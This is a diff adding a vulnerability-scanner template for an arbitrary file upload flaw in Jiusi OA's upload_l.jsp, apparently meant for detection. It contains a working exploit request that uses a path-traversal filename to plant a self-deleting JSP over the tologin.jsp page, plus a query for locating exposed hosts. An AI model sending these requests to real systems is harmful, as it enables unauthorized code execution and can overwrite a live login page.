@@ -1,0 +1,39 @@
+id: jsoa-upload_l-fileupload
+info:
+  name: 九思 OA upload_l.jsp - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E4%B9%9D%E6%80%9DOA/%E4%B9%9D%E6%80%9DOA%E7%B3%BB%E7%BB%9Fupload_l.jsp%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+    - https://github.com/CRlife/Rscan/commit/7e6b361e2d328ea4623b0baa68767d5e696e8a70
+  metadata:
+    verified: false
+    max-request: 1
+    fofa-query: app="九思软件-OA" || body="/jsoa/webmail/ajax_util.js"
+    hunter-query: demo
+  tags: jsoa,oa,fileupload
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y/%M/%D")}}'
+
+http:
+  - raw:
+      - |
+        POST /jsoa/wpsforlinux/src/upload_l.jsp?openType=1&flowflag=1&userName=1&recordId=1 HTTP/1.1
+        Host: {{Hostname}}
+        filename: /../../tologin.jsp
+        
+        <%out.println("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+      
+      - |+
+        GET /jsoa/tologin.jsp HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
